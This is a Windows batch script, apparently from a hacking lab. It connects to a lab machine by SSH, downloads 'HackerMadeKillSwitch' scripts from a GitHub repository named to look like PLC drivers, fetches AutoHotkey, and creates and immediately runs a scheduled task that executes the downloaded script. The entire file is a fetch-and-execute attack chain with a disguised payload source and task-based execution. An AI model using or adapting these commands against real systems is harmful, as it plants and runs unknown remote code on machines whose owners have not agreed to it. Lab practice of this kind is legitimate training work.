:: SSH into Computer ____NOTE!!!: This one does not work!
ssh C4MLabuser9@172.16.6.29

:: Create HackerFolder
mkdir "C:\Users\c4mlabuser9\Desktop\HackerFolder"

:: Download BAT script
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/TheIOTeamer/plc-runtime-drivers/main/HackerMadeKillSwitch.bat' -OutFile 'C:\Users\c4mlabuser9\Desktop\HackerFolder\HackerMadeKillSwitch.bat'"

:: Download AHK script
powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/TheIOTeamer/plc-runtime-drivers/main/HackerMadeKillSwitch.ahk' -OutFile 'C:\Users\c4mlabuser9\Desktop\HackerFolder\HackerMadeKillSwitch.ahk'"

:: Download AutoHotkey Portable
powershell -Command "Invoke-WebRequest -Uri 'https://www.autohotkey.com/download/1.1/AutoHotkey_1.1.36.02.zip' -OutFile 'C:\Users\c4mlabuser9\Desktop\HackerFolder\AHK.zip'"

:: Extract AutoHotkey ZIP
powershell -Command "Expand-Archive -Path 'C:\Users\c4mlabuser9\Desktop\HackerFolder\AHK.zip' -DestinationPath 'C:\Users\c4mlabuser9\Desktop\HackerFolder\AHK'"

:: Create scheduled task to run AHK script
schtasks /Create /TN "NewHackerMadeKillSwitchRunner" ^
  /TR "\"C:\Users\c4mlabuser9\Desktop\HackerFolder\AHK\AutoHotkeyU64.exe\" \"C:\Users\c4mlabuser9\Desktop\HackerFolder\HackerMadeKillSwitch.ahk\"" ^
  /SC ONCE /ST 23:59 /F /RU c4mlabuser9

:: Run the task immediately
schtasks /Run /TN "NewHackerMadeKillSwitchRunner"

pause

